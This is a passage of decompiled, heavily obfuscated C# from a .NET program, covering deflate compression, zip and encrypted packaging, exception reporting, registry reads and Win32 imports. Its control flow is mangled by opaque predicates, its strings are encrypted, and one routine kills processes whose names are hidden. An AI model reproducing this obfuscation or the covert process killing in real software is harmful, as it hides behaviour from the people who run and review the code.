		goto IL_006d;
		IL_006d:
		class25_0.byte_0[class25_0.int_1++] = (byte)class25_0.uint_0;
		class25_0.uint_0 >>= 8;
		class25_0.int_2 -= 8;
		goto IL_00a8;
	}

	static void smethod_43(Exception exception_0)
	{
		while (exception_0 != null)
		{
			while (exception_0 is SecurityException)
			{
				if (aoKmv57A4wSEkvDOgia())
				{
					switch (0)
					{
					default:
						return;
					case 5:
						break;
					case 4:
						goto IL_003c;
					case 0:
					case 2:
						goto IL_0044;
					case 1:
					case 3:
						return;
					case 6:
						return;
					}
					continue;
				}
				return;
				IL_0044:
				if (!(Class39.string_0 == Class14.smethod_0(2062)) || !Class39.Handler.method_2((SecurityException)exception_0))
				{
					break;
				}
				return;
			}
			break;
			IL_003c:;
		}
		Class39.Handler.method_3(exception_0, bool_1: false, bool_2: false);
	}

	static bool smethod_44(bool bool_0, bool bool_1, Class15.Class24 class24_0)
	{
		int num;
		if (class24_0.int_5 < 262)
		{
			num = 10;
			if (!XdRJXa7sy9ebEBASZRt())
			{
				goto IL_0117;
			}
			goto IL_01cc;
		}
		goto IL_0296;
		IL_01f1:
		int num2 = default(int);
		if (num2 != 0)
		{
			goto IL_01f8;
		}
		goto IL_0279;
		IL_0296:
		int int_ = default(int);
		int num3 = default(int);
		byte[] byte_ = default(byte[]);
		int int_2 = default(int);
		Class15.Class22 class22_ = default(Class15.Class22);
		if (class24_0.int_5 >= 262 || bool_0)
		{
			if (class24_0.int_5 != 0)
			{
				if (class24_0.int_4 >= 65274)
				{
					Class33.smethod_151(class24_0);
				}
				int_ = class24_0.int_1;
				num3 = class24_0.int_2;
				if (class24_0.int_5 >= 3)
				{
					num2 = Class33.smethod_67(class24_0);
					goto IL_01f1;
				}
				goto IL_0279;
			}
			if (class24_0.bool_0)
			{
				Class33.smethod_84(class24_0.class22_0, class24_0.byte_0[class24_0.int_4 - 1] & 0xFF);
			}
			class24_0.bool_0 = false;
			class22_ = class24_0.class22_0;
			byte_ = class24_0.byte_0;
			int_2 = class24_0.int_3;
			int int_3 = class24_0.int_4 - class24_0.int_3;
			Class33.smethod_45(byte_, int_2, class22_, int_3, bool_1);
			class24_0.int_3 = class24_0.int_4;
			goto IL_031e;
		}
		goto IL_0358;
		IL_0212:
		if (class24_0.int_2 <= 5 && class24_0.int_2 == 3 && class24_0.int_4 - class24_0.int_1 > 4096)
		{
			class24_0.int_2 = 2;
		}
		goto IL_0279;
		IL_0336:
		int num4 = default(int);
		bool flag = default(bool);
		Class33.smethod_45(byte_, int_2, class22_, num4, flag);
		class24_0.int_3 += num4;
		goto IL_0351;
		IL_0117:
		switch (num)
		{
		case 15:
			break;
		case 2:
			goto IL_0166;
		case 7:
			class24_0.int_4++;
			class24_0.int_5--;
			goto default;
		default:
			class24_0.bool_0 = false;
			class24_0.int_2 = 2;
			goto IL_01b7;
		case 1:
			goto IL_01cc;
		case 12:
			goto IL_01f1;
		case 6:
			goto IL_01f8;
		case 13:
			goto IL_0212;
		case 4:
			goto IL_0279;
		case 0:
		case 10:
			goto IL_0283;
		case 9:
			goto IL_031e;
		case 11:
			goto IL_0326;
		case 3:
			goto IL_0336;
		case 5:
			goto IL_0351;
		case 17:
			goto IL_0358;
		case 16:
		{
			bool result = default(bool);
			return result;
		}
		}
		goto IL_0101;
		IL_0351:
		return !flag;
		IL_0101:
		if (--num3 > 0)
		{
			goto IL_00d5;
		}
		num = 7;
		if (!XdRJXa7sy9ebEBASZRt())
		{
		}
		goto IL_0117;
		IL_00d5:
		class24_0.int_4++;
		class24_0.int_5--;
		if (class24_0.int_5 >= 3)
		{
			Class33.smethod_67(class24_0);
		}
		goto IL_0101;
		IL_0279:
		if (num3 < 3 || class24_0.int_2 > num3)
		{
			if (class24_0.bool_0)
			{
				Class33.smethod_84(class24_0.class22_0, class24_0.byte_0[class24_0.int_4 - 1] & 0xFF);
			}
			goto IL_01cc;
		}
		Class15.Class22 class22_2 = class24_0.class22_0;
		int int_4 = class24_0.int_4 - 1 - int_;
		Class33.smethod_51(int_4, class22_2, num3);
		num3 -= 2;
		goto IL_00d5;
		IL_031e:
		return false;
		IL_0166:
		num4--;
		goto IL_0185;
		IL_0326:
		byte_ = class24_0.byte_0;
		int_2 = class24_0.int_3;
		goto IL_0336;
		IL_01f8:
		if (class24_0.int_4 - num2 <= 32506 && Class33.smethod_128(num2, class24_0))
		{
			goto IL_0212;
		}
		goto IL_0279;
		IL_01cc:
		class24_0.bool_0 = true;
		class24_0.int_4++;
		class24_0.int_5--;
		goto IL_01b7;
		IL_01b7:
		if (Class33.smethod_100(class24_0.class22_0))
		{
			num4 = class24_0.int_4 - class24_0.int_3;
			if (class24_0.bool_0)
			{
				goto IL_0166;
			}
			goto IL_0185;
		}
		goto IL_0296;
		IL_0283:
		if (!bool_0)
		{
			return false;
		}
		goto IL_0296;
		IL_0185:
		flag = bool_1 && class24_0.int_5 == 0 && !class24_0.bool_0;
		class22_ = class24_0.class22_0;
		num = 11;
		if (aoKmv57A4wSEkvDOgia())
		{
			goto IL_0117;
		}
		goto IL_0326;
		IL_0358:
		return true;
	}

	static void smethod_45(byte[] byte_0, int int_0, Class15.Class22 class22_0, int int_1, bool bool_0)
	{
		class22_0.class23_0.short_0[256]++;
		Class33.smethod_153(class22_0.class23_0);
		Class33.smethod_153(class22_0.class23_1);
		Class33.smethod_31(class22_0.class23_0, class22_0.class23_2);
		Class33.smethod_31(class22_0.class23_1, class22_0.class23_2);
		Class33.smethod_153(class22_0.class23_2);
		int num = 4;
		for (int num2 = 18; num2 > num; num2--)
		{
			if (class22_0.class23_2.byte_0[Class15.Class22.int_0[num2]] > 0)
			{
				num = num2 + 1;
			}
		}
		int num3 = 14 + num * 3 + Class33.smethod_122(class22_0.class23_2) + Class33.smethod_122(class22_0.class23_0) + Class33.smethod_122(class22_0.class23_1) + class22_0.int_2;
		int num4 = class22_0.int_2;
		for (int i = 0; i < 286; i++)
		{
			num4 += class22_0.class23_0.short_0[i] * Class15.Class22.byte_2[i];
		}
		for (int j = 0; j < 30; j++)
		{
			num4 += class22_0.class23_1.short_0[j] * Class15.Class22.byte_3[j];
		}
		if (num3 >= num4)
		{
			num3 = num4;
		}
		if (int_0 >= 0 && int_1 + 4 < num3 >> 3)
		{
			Class33.smethod_65(bool_0, int_1, byte_0, class22_0, int_0);
		}
		else if (num3 == num4)
		{
			Class33.smethod_144(class22_0.class25_0, 2 + (bool_0 ? 1 : 0), 3);
			Class15.Class22.Class23 class23_ = class22_0.class23_0;
			short[] short_ = Class15.Class22.short_1;
			byte[] byte_ = Class15.Class22.byte_2;
			Class33.smethod_118(byte_, class23_, short_);
			class23_ = class22_0.class23_1;
			short_ = Class15.Class22.short_2;
			byte_ = Class15.Class22.byte_3;
			Class33.smethod_118(byte_, class23_, short_);
			Class33.smethod_20(class22_0);
			Class33.smethod_109(class22_0);
		}
		else
		{
			Class33.smethod_144(class22_0.class25_0, 4 + (bool_0 ? 1 : 0), 3);
			Class33.smethod_111(class22_0, num);
			Class33.smethod_20(class22_0);
			Class33.smethod_109(class22_0);
		}
	}

	static bool smethod_46(Class29 class29_0, string string_0)
	{
		try
		{
			byte[] byte_ = class29_0.method_4();
			byte[] byte_2;
			try
			{
				byte_2 = Class33.smethod_71(byte_);
			}
			catch
			{
				byte_2 = null;
			}
			byte[] array = Class33.smethod_4(byte_2, Class14.smethod_0(1322));
			FileStream fileStream = File.OpenWrite(string_0);
			byte[] bytes = Encoding.ASCII.GetBytes(Class14.smethod_0(1264));
			fileStream.Write(bytes, 0, bytes.Length);
			fileStream.Write(array, 0, array.Length);
			fileStream.Close();
			return true;
		}
		catch (ThreadAbortException)
		{
			return false;
		}
		catch (Exception)
		{
			return false;
		}
	}

	static void smethod_47(string string_0, string string_1, Class29 class29_0)
	{
		if (File.Exists(string_0))
		{
			Class29.Struct11 value = new Class29.Struct11(string_0);
			class29_0.dictionary_1.Add(string_1, value);
		}
	}

	[DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	internal static extern IntPtr LoadLibraryA([MarshalAs(UnmanagedType.VBByRefStr)] ref string string_0);

	static void smethod_48(Exception exception_0, object[] object_0)
	{
		try
		{
			if ((object)exception_0.GetType() == typeof(Exception) && exception_0.Message == Class14.smethod_0(2049))
			{
				exception_0 = exception_0.InnerException;
			}
			else
			{
				Class33.smethod_73(exception_0, object_0);
			}
			Class39.Handler.method_3(exception_0, bool_1: true, bool_2: true);
		}
		catch
		{
		}
	}

	[DllImport("kernel32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	internal static extern long QueueUserWorkItem(long long_0, ref long long_1, long long_2);

	static int smethod_49(Class29 class29_0, Class29.Struct13 struct13_0)
	{
		string key = struct13_0.struct12_0.string_0.ToUpper();
		if (class29_0.dictionary_3.ContainsKey(key))
		{
			return class29_0.dictionary_3[key];
		}
		int count = class29_0.list_2.Count;
		class29_0.list_2.Add(struct13_0.struct12_0);
		class29_0.dictionary_3.Add(key, count);
		return count;
	}

	static bool smethod_50(string string_0, EventArgs1 eventArgs1_0)
	{
		if (File.Exists(string_0))
		{
			File.Delete(string_0);
		}
		return Class33.smethod_46(eventArgs1_0.class29_0, string_0);
	}

	[DllImport("kernel32")]
	internal static extern bool MoveFileEx(string string_0, string string_1, int int_0);

	static bool smethod_51(int int_0, Class15.Class22 class22_0, int int_1)
	{
		class22_0.short_0[class22_0.int_1] = (short)int_0;
		while (true)
		{
			class22_0.byte_1[class22_0.int_1++] = (byte)(int_1 - 3);
			int num = Class33.smethod_150(int_1 - 3, class22_0);
			class22_0.class23_0.short_0[num]++;
			while (true)
			{
				if (num >= 265)
				{
					goto IL_0041;
				}
				goto IL_005f;
				IL_005f:
				int num2 = Class33.smethod_23(class22_0, int_0 - 1);
				class22_0.class23_1.short_0[num2]++;
				if (num2 >= 4)
				{
					if (!aoKmv57A4wSEkvDOgia())
					{
						break;
					}
					switch (5)
					{
					case 1:
						continue;
					case 0:
					case 4:
						goto end_IL_008e;
					case 5:
						class22_0.int_2 += num2 / 2 - 1;
						goto IL_00f2;
					case 6:
						goto IL_00f2;
					}
					goto IL_0041;
				}
				goto IL_00f2;
				IL_0041:
				if (num < 285)
				{
					class22_0.int_2 += (num - 261) / 4;
				}
				goto IL_005f;
				IL_00f2:
				return Class33.smethod_100(class22_0);
				continue;
				end_IL_008e:
				break;
			}
		}
	}

	static bool smethod_52(Class15.Class20 class20_0, Class15.Class17 class17_0)
	{
		bool result = default(bool);
		int int_2 = default(int);
		int num4 = default(int);
		while (true)
		{
			int int_ = class20_0.int_2;
			int num = 5;
			if (!aoKmv57A4wSEkvDOgia())
			{
				break;
			}
			while (true)
			{
				switch (num)
				{
				case 11:
					break;
				case 15:
					goto IL_001b;
				default:
					goto IL_0074;
				case 8:
					goto IL_0095;
				case 1:
					goto IL_00e8;
				case 5:
					goto IL_00f4;
				case 0:
					goto IL_0180;
				case 14:
					goto IL_0289;
				case 3:
				case 12:
					goto IL_02c8;
				case 7:
					goto IL_02f5;
				case 2:
				case 10:
					goto end_IL_0000;
				case 4:
					goto IL_0305;
				case 13:
					goto IL_030e;
				case 9:
				case 16:
					return result;
				}
				break;
				IL_0180:
				class20_0.int_8 = 0;
				class20_0.int_2 = 3;
				goto IL_01cc;
				IL_00f4:
				switch (int_)
				{
				case 2:
					break;
				case 1:
					goto IL_00c1;
				default:
					goto IL_0112;
				case 0:
					goto IL_0120;
				case 3:
					goto IL_01cc;
				case 4:
					goto IL_023c;
				case 5:
					goto IL_0273;
				}
				goto IL_0046;
				IL_01cc:
				while (class20_0.int_8 < class20_0.int_5)
				{
					int num2 = Class33.smethod_81(class17_0, 3);
					if (num2 >= 0)
					{
						Class33.smethod_77(class17_0, 3);
						class20_0.byte_0[Class15.Class20.int_9[class20_0.int_8]] = (byte)num2;
						class20_0.int_8++;
						continue;
					}
					goto IL_02f5;
				}
				class20_0.class19_0 = new Class15.Class19(class20_0.byte_0);
				class20_0.byte_0 = null;
				class20_0.int_8 = 0;
				class20_0.int_2 = 4;
				goto IL_023c;
				IL_02f5:
				return false;
				IL_023c:
				int num3;
				while (((num3 = Class33.smethod_17(class20_0.class19_0, class17_0)) & -16) == 0)
				{
					class20_0.byte_1[class20_0.int_8++] = (class20_0.byte_2 = (byte)num3);
					if (class20_0.int_8 == class20_0.int_6)
					{
						goto end_IL_0000;
					}
				}
				if (num3 >= 0)
				{
					if (num3 >= 17)
					{
						class20_0.byte_2 = 0;
					}
					class20_0.int_7 = num3 - 16;
					class20_0.int_2 = 5;
					goto IL_0273;
				}
				return false;
				IL_0120:
				class20_0.int_3 = Class33.smethod_81(class17_0, 5);
				goto IL_0095;
				IL_0112:
				num = 11;
				if (XdRJXa7sy9ebEBASZRt())
				{
				}
				continue;
				IL_00c1:
				class20_0.int_4 = Class33.smethod_81(class17_0, 5);
				if (class20_0.int_4 >= 0)
				{
					class20_0.int_4++;
					goto IL_00e8;
				}
				goto IL_030e;
				IL_0046:
				class20_0.int_5 = Class33.smethod_81(class17_0, 4);
				if (class20_0.int_5 >= 0)
				{
					class20_0.int_5 += 4;
					Class33.smethod_77(class17_0, 4);
					goto IL_0074;
				}
				return false;
				IL_0273:
				int_2 = Class15.Class20.int_1[class20_0.int_7];
				num4 = Class33.smethod_81(class17_0, int_2);
				goto IL_0289;
				IL_0289:
				if (num4 >= 0)
				{
					Class33.smethod_77(class17_0, int_2);
					num4 += Class15.Class20.int_0[class20_0.int_7];
					goto IL_02c8;
				}
				return false;
				IL_0074:
				class20_0.byte_0 = new byte[19];
				num = 0;
				if (aoKmv57A4wSEkvDOgia())
				{
					continue;
				}
				goto IL_030e;
				IL_02c8:
				while (num4-- > 0)
				{
					class20_0.byte_1[class20_0.int_8++] = class20_0.byte_2;
				}
				if (class20_0.int_8 == class20_0.int_6)
				{
					goto IL_0305;
				}
				class20_0.int_2 = 4;
				break;
				IL_030e:
				return false;
				IL_0305:
				return true;
				IL_001b:
				class20_0.int_6 = class20_0.int_3 + class20_0.int_4;
				class20_0.byte_1 = new byte[class20_0.int_6];
				class20_0.int_2 = 2;
				goto IL_0046;
				IL_00e8:
				Class33.smethod_77(class17_0, 5);
				goto IL_001b;
				IL_0095:
				if (class20_0.int_3 >= 0)
				{
					class20_0.int_3 += 257;
					Class33.smethod_77(class17_0, 5);
					class20_0.int_2 = 1;
					goto IL_00c1;
				}
				return false;
			}
			continue;
			end_IL_0000:
			break;
		}
		return true;
	}

	static void smethod_53(byte[] byte_0, Class15.Class24 class24_0)
	{
		class24_0.byte_1 = byte_0;
		class24_0.int_7 = 0;
		class24_0.int_8 = byte_0.Length;
	}

	static byte[] smethod_54(byte[] byte_0, byte[] byte_1, int int_0, byte[] byte_2)
	{
		try
		{
			Class15.Stream0 stream = new Class15.Stream0();
			switch (int_0)
			{
			case 0:
			{
				Class15.Class21 class2 = new Class15.Class21();
				DateTime now = DateTime.Now;
				long num3 = (uint)((((now.Year - 1980) & 0x7F) << 25) | (now.Month << 21) | (now.Day << 16) | (now.Hour << 11) | (now.Minute << 5) | (int)((uint)now.Second >> 1));
				uint[] array8 = new uint[256]
				{
					0u, 1996959894u, 3993919788u, 2567524794u, 124634137u, 1886057615u, 3915621685u, 2657392035u, 249268274u, 2044508324u,
					3772115230u, 2547177864u, 162941995u, 2125561021u, 3887607047u, 2428444049u, 498536548u, 1789927666u, 4089016648u, 2227061214u,
					450548861u, 1843258603u, 4107580753u, 2211677639u, 325883990u, 1684777152u, 4251122042u, 2321926636u, 335633487u, 1661365465u,
					4195302755u, 2366115317u, 997073096u, 1281953886u, 3579855332u, 2724688242u, 1006888145u, 1258607687u, 3524101629u, 2768942443u,
					901097722u, 1119000684u, 3686517206u, 2898065728u, 853044451u, 1172266101u, 3705015759u, 2882616665u, 651767980u, 1373503546u,
					3369554304u, 3218104598u, 565507253u, 1454621731u, 3485111705u, 3099436303u, 671266974u, 1594198024u, 3322730930u, 2970347812u,
					795835527u, 1483230225u, 3244367275u, 3060149565u, 1994146192u, 31158534u, 2563907772u, 4023717930u, 1907459465u, 112637215u,
					2680153253u, 3904427059u, 2013776290u, 251722036u, 2517215374u, 3775830040u, 2137656763u, 141376813u, 2439277719u, 3865271297u,
					1802195444u, 476864866u, 2238001368u, 4066508878u, 1812370925u, 453092731u, 2181625025u, 4111451223u, 1706088902u, 314042704u,
					2344532202u, 4240017532u, 1658658271u, 366619977u, 2362670323u, 4224994405u, 1303535960u, 984961486u, 2747007092u, 3569037538u,
					1256170817u, 1037604311u, 2765210733u, 3554079995u, 1131014506u, 879679996u, 2909243462u, 3663771856u, 1141124467u, 855842277u,
					2852801631u, 3708648649u, 1342533948u, 654459306u, 3188396048u, 3373015174u, 1466479909u, 544179635u, 3110523913u, 3462522015u,
					1591671054u, 702138776u, 2966460450u, 3352799412u, 1504918807u, 783551873u, 3082640443u, 3233442989u, 3988292384u, 2596254646u,
					62317068u, 1957810842u, 3939845945u, 2647816111u, 81470997u, 1943803523u, 3814918930u, 2489596804u, 225274430u, 2053790376u,
					3826175755u, 2466906013u, 167816743u, 2097651377u, 4027552580u, 2265490386u, 503444072u, 1762050814u, 4150417245u, 2154129355u,
					426522225u, 1852507879u, 4275313526u, 2312317920u, 282753626u, 1742555852u, 4189708143u, 2394877945u, 397917763u, 1622183637u,
					3604390888u, 2714866558u, 953729732u, 1340076626u, 3518719985u, 2797360999u, 1068828381u, 1219638859u, 3624741850u, 2936675148u,
					906185462u, 1090812512u, 3747672003u, 2825379669u, 829329135u, 1181335161u, 3412177804u, 3160834842u, 628085408u, 1382605366u,
					3423369109u, 3138078467u, 570562233u, 1426400815u, 3317316542u, 2998733608u, 733239954u, 1555261956u, 3268935591u, 3050360625u,
					752459403u, 1541320221u, 2607071920u, 3965973030u, 1969922972u, 40735498u, 2617837225u, 3943577151u, 1913087877u, 83908371u,
					2512341634u, 3803740692u, 2075208622u, 213261112u, 2463272603u, 3855990285u, 2094854071u, 198958881u, 2262029012u, 4057260610u,
					1759359992u, 534414190u, 2176718541u, 4139329115u, 1873836001u, 414664567u, 2282248934u, 4279200368u, 1711684554u, 285281116u,
					2405801727u, 4167216745u, 1634467795u, 376229701u, 2685067896u, 3608007406u, 1308918612u, 956543938u, 2808555105u, 3495958263u,
					1231636301u, 1047427035u, 2932959818u, 3654703836u, 1088359270u, 936918000u, 2847714899u, 3736837829u, 1202900863u, 817233897u,
					3183342108u, 3401237130u, 1404277552u, 615818150u, 3134207493u, 3453421203u, 1423857449u, 601450431u, 3009837614u, 3294710456u,
					1567103746u, 711928724u, 3020668471u, 3272380065u, 1510334235u, 755167117u
				};
				uint num4 = uint.MaxValue;
				uint num5 = uint.MaxValue;
				int num6 = 0;
				int num7 = byte_1.Length;
				while (--num7 >= 0)
				{
					num5 = array8[(num5 ^ byte_1[num6++]) & 0xFF] ^ (num5 >> 8);
				}
				num5 ^= num4;
				Class33.smethod_117(stream, 67324752);
				Class33.smethod_89(20, stream);
				Class33.smethod_89(0, stream);
				Class33.smethod_89(8, stream);
				Class33.smethod_117(stream, (int)num3);
				Class33.smethod_117(stream, (int)num5);
				long position3 = stream.Position;
				Class33.smethod_117(stream, 0);
				Class33.smethod_117(stream, byte_1.Length);
				byte[] bytes = Encoding.UTF8.GetBytes("{data}");
				Class33.smethod_89(bytes.Length, stream);
				Class33.smethod_89(0, stream);
				stream.Write(bytes, 0, bytes.Length);
				Class33.smethod_83(byte_1, class2);
				while (!class2.IsNeedingInput)
				{
					byte[] array9 = new byte[512];
					int num8 = Class33.smethod_147(class2, array9);
					if (num8 <= 0)
					{
						break;
					}
					stream.Write(array9, 0, num8);
				}
				Class33.smethod_103(class2);
				while (!class2.IsFinished)
				{
					byte[] array10 = new byte[512];
					int num9 = Class33.smethod_147(class2, array10);
					if (num9 <= 0)
					{
						break;
					}
					stream.Write(array10, 0, num9);
				}
				long totalOut = class2.TotalOut;
				Class33.smethod_117(stream, 33639248);
				Class33.smethod_89(20, stream);
				Class33.smethod_89(20, stream);
				Class33.smethod_89(0, stream);
				Class33.smethod_89(8, stream);
				Class33.smethod_117(stream, (int)num3);
				Class33.smethod_117(stream, (int)num5);
				Class33.smethod_117(stream, (int)totalOut);
				Class33.smethod_117(stream, byte_1.Length);
				Class33.smethod_89(bytes.Length, stream);
				Class33.smethod_89(0, stream);
				Class33.smethod_89(0, stream);
				Class33.smethod_89(0, stream);
				Class33.smethod_89(0, stream);
				Class33.smethod_117(stream, 0);
				Class33.smethod_117(stream, 0);
				stream.Write(bytes, 0, bytes.Length);
				Class33.smethod_117(stream, 101010256);
				Class33.smethod_89(0, stream);
				Class33.smethod_89(0, stream);
				Class33.smethod_89(1, stream);
				Class33.smethod_89(1, stream);
				Class33.smethod_117(stream, 46 + bytes.Length);
				Class33.smethod_117(stream, (int)(30 + bytes.Length + totalOut));
				Class33.smethod_89(0, stream);
				stream.Seek(position3, SeekOrigin.Begin);
				Class33.smethod_117(stream, (int)totalOut);
				break;
			}
			case 1:
			{
				Class33.smethod_117(stream, 25000571);
				Class33.smethod_117(stream, byte_1.Length);
				byte[] array5;
				for (int i = 0; i < byte_1.Length; i += array5.Length)
				{
					array5 = new byte[Math.Min(2097151, byte_1.Length - i)];
					Buffer.BlockCopy(byte_1, i, array5, 0, array5.Length);
					long position = stream.Position;
					Class33.smethod_117(stream, 0);
					Class33.smethod_117(stream, array5.Length);
					Class15.Class21 @class = new Class15.Class21();
					Class33.smethod_83(array5, @class);
					while (!@class.IsNeedingInput)
					{
						byte[] array6 = new byte[512];
						int num = Class33.smethod_147(@class, array6);
						if (num <= 0)
						{
							break;
						}
						stream.Write(array6, 0, num);
					}
					Class33.smethod_103(@class);
					while (!@class.IsFinished)
					{
						byte[] array7 = new byte[512];
						int num2 = Class33.smethod_147(@class, array7);
						if (num2 <= 0)
						{
							break;
						}
						stream.Write(array7, 0, num2);
					}
					long position2 = stream.Position;
					stream.Position = position;
					Class33.smethod_117(stream, (int)@class.TotalOut);
					stream.Position = position2;
				}
				break;
			}
			case 2:
			{
				Class33.smethod_117(stream, 41777787);
				byte[] array3 = Class33.smethod_54((byte[])null, byte_1, 1, (byte[])null);
				using (ICryptoTransform cryptoTransform2 = Class33.smethod_34(byte_0, bool_0: false, byte_2))
				{
					byte[] array4 = cryptoTransform2.TransformFinalBlock(array3, 0, array3.Length);
					stream.Write(array4, 0, array4.Length);
				}
				break;
			}
			case 3:
			{
				Class33.smethod_117(stream, 58555003);
				byte[] array = Class33.smethod_54((byte[])null, byte_1, 1, (byte[])null);
				using (ICryptoTransform cryptoTransform = Class33.smethod_145(byte_0, byte_2, bool_0: false))
				{
					byte[] array2 = cryptoTransform.TransformFinalBlock(array, 0, array.Length);
					stream.Write(array2, 0, array2.Length);
				}
				break;
			}
			}
			stream.Flush();
			stream.Close();
			return stream.ToArray();
		}
		catch (Exception ex)
		{
			Class15.string_0 = "ERR 2003: " + ex.Message;
			throw;
		}
	}

	static void smethod_55(int int_0, int int_1, Class15.Class17 class17_0, byte[] byte_0)
	{
		if (class17_0.int_0 >= class17_0.int_1)
		{
			int num = int_1 + int_0;
			if (0 > int_1)
			{
				goto IL_00bd;
			}
			int num2 = 3;
			if (!XdRJXa7sy9ebEBASZRt())
			{
			}
			while (true)
			{
				switch (num2)
				{
				case 5:
					class17_0.int_2 += 8;
					goto IL_0038;
				case 1:
				case 3:
					if (int_1 <= num && num <= byte_0.Length)
					{
						if (((uint)int_0 & (true ? 1u : 0u)) != 0)
						{
							class17_0.uint_0 |= (uint)((byte_0[int_1++] & 0xFF) << class17_0.int_2);
							goto case 5;
						}
						goto IL_0038;
					}
					goto IL_00bd;
				case 0:
				case 4:
					break;
				case 6:
					class17_0.int_1 = num;
					return;
				default:
					goto IL_00bd;
					IL_0038:
					class17_0.byte_0 = byte_0;
					class17_0.int_0 = int_1;
					num2 = 6;
					if (aoKmv57A4wSEkvDOgia())
					{
						continue;
					}
					goto case 6;
				}
				break;
			}
		}
		throw new InvalidOperationException();
		IL_00bd:
		throw new ArgumentOutOfRangeException();
	}

	static void smethod_56(Class28 class28_0, IWebProxy iwebProxy_0)
	{
		class28_0.iwebProxy_0 = iwebProxy_0;
	}

	static object smethod_57(string string_0, object object_0)
	{
		using RegistryKey registryKey = Registry.LocalMachine.OpenSubKey(Class13.SubkeyApplication);
		if (registryKey == null)
		{
			return object_0;
		}
		return registryKey.GetValue(string_0, object_0);
	}

	[DllImport("user32.dll")]
	internal static extern int GetSystemMetrics(int int_0);

	static void smethod_58(EventArgs1 eventArgs1_0)
	{
		eventArgs1_0.bool_1 = false;
	}

	[DllImport("shell32")]
	internal static extern int ExtractIconEx(string string_0, int int_0, ref int int_1, ref int int_2, int int_3);

	static void smethod_59(Class28 class28_0, Enum1 enum1_0, string string_0, string string_1)
	{
		class28_0.delegate11_0?.Invoke(class28_0, new EventArgs3(enum1_0, string_0, string_1));
	}

	static bool smethod_60(string string_0)
	{
		Process[] processesByName = Process.GetProcessesByName(Path.GetFileNameWithoutExtension(Application.get_ExecutablePath()));
		Process[] array = processesByName;
		int num = 0;
		bool result = default(bool);
		if (0 >= array.Length)
		{
			return result;
		}
		Process process = array[num];
		if (process == null)
		{
			return false;
		}
		return true;
	}

	[DllImport("NETAPI32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	internal static extern long NetMessageNameDel([MarshalAs(UnmanagedType.VBByRefStr)] ref string string_0, [MarshalAs(UnmanagedType.VBByRefStr)] ref string string_1);

	static byte[] smethod_61(byte[] byte_0, byte[] byte_1, byte[] byte_2)
	{
		return Class33.smethod_54(byte_0, byte_2, 3, byte_1);
	}

	static bool smethod_62(Assembly assembly_0, Assembly assembly_1)
	{
		byte[] publicKey = assembly_0.GetName().GetPublicKey();
		byte[] publicKey2 = assembly_1.GetName().GetPublicKey();
		if (publicKey2 == null != (publicKey == null))
		{
			return false;
		}
		if (publicKey2 != null)
		{
			for (int i = 0; i < publicKey2.Length; i++)
			{
				if (publicKey2[i] != publicKey[i])
				{
					return false;
				}
			}
		}
		return true;
	}

	static int smethod_63(int int_0, Class15.Class18 class18_0, int int_1, byte[] byte_0)
	{
		int num = class18_0.int_0;
		int num2 = default(int);
		if (aoKmv57A4wSEkvDOgia())
		{
			switch (4)
			{
			case 4:
				if (int_0 > class18_0.int_1)
				{
					goto case 5;
				}
				num = (class18_0.int_0 - class18_0.int_1 + int_0) & 0x7FFF;
				goto default;
			case 5:
				int_0 = class18_0.int_1;
				goto default;
			default:
			{
				num2 = int_0;
				int num3 = int_0 - num;
				if (num3 > 0)
				{
					Array.Copy(class18_0.byte_0, 32768 - num3, byte_0, int_1, num3);
					int_1 += num3;
					int_0 = num;
				}
				Array.Copy(class18_0.byte_0, num - int_0, byte_0, int_1, int_0);
				class18_0.int_1 -= num2;
				break;
			}
			case 1:
			case 3:
				break;
			case 6:
				goto IL_00b8;
			}
		}
		if (class18_0.int_1 >= 0)
		{
			return num2;
		}
		goto IL_00b8;
		IL_00b8:
		throw new InvalidOperationException();
	}

	static void smethod_64(Control3 control3_0, bool bool_0)
	{
		if (aoKmv57A4wSEkvDOgia())
		{
			switch (4)
			{
			case 0:
			case 4:
				control3_0.timer_0.set_Enabled(bool_0);
				goto case 1;
			case 1:
			case 2:
				control3_0.int_0 = 0;
				break;
			case 5:
				return;
			}
		}
		((Control)control3_0).Refresh();
	}

	static void smethod_65(bool bool_0, int int_0, byte[] byte_0, Class15.Class22 class22_0, int int_1)
	{
		Class33.smethod_144(class22_0.class25_0, bool_0 ? 1 : 0, 3);
		Class33.smethod_22(class22_0.class25_0);
		Class33.smethod_152(class22_0.class25_0, int_0);
		Class33.smethod_152(class22_0.class25_0, ~int_0);
		Class33.smethod_107(int_0, byte_0, class22_0.class25_0, int_1);
		Class33.smethod_109(class22_0);
	}

	static void smethod_66(Control0 control0_0)
	{
		control0_0.timer_0.set_Enabled(false);
		control0_0.image_0 = null;
		control0_0.bool_0 = false;
		control0_0.string_0 = string.Empty;
		((Control)control0_0).Refresh();
		((Control)control0_0).set_Height(16);
	}

	static int smethod_67(Class15.Class24 class24_0)
	{
		int num = ((class24_0.int_0 << 5) ^ class24_0.byte_0[class24_0.int_4 + 2]) & 0x7FFF;
		while (true)
		{
			short num2 = (class24_0.short_1[class24_0.int_4 & 0x7FFF] = class24_0.short_0[num]);
			class24_0.short_0[num] = (short)class24_0.int_4;
			while (true)
			{
				class24_0.int_0 = num;
				int num3 = 4;
				if (!XdRJXa7sy9ebEBASZRt())
				{
				}
				while (true)
				{
					switch (num3)
					{
					default:
						num3 = 2;
						if (!XdRJXa7sy9ebEBASZRt())
						{
						}
						continue;
					case 1:
					case 2:
						break;
					case 0:
					case 3:
						goto end_IL_0048;
					case 4:
						return num2 & 0xFFFF;
					}
					break;
				}
				continue;
				end_IL_0048:
				break;
			}
		}
	}

	static void smethod_68()
	{
		//IL_0061: Unknown result type (might be due to invalid IL or missing references)
		Process[] processesByName = Process.GetProcessesByName(Class14.smethod_0(2067));
		if (processesByName.Length <= 0)
		{
			return;
		}
		checked
		{
			int num = processesByName.Length - 1;
			for (int i = 0; i <= num; i++)
			{
				if (!processesByName[i].HasExited && (double)processesByName[i].WorkingSet64 / 1024.0 < 130.0)
				{
					try
					{
						processesByName[i].Kill();
					}
					catch (Exception ex)
					{
						ProjectData.SetProjectError(ex);
						Exception ex2 = ex;
						MessageBox.Show(ex2.Message);
						ProjectData.ClearProjectError();
					}
				}
			}
		}
	}

	static void smethod_69(Control0 control0_0)
	{
		Class33.smethod_124(control0_0, string.Empty);
	}

	static void smethod_70()
	{
		try
		{
			Class10.smethod_0();
		}
		catch (Exception)
		{
		}
	}

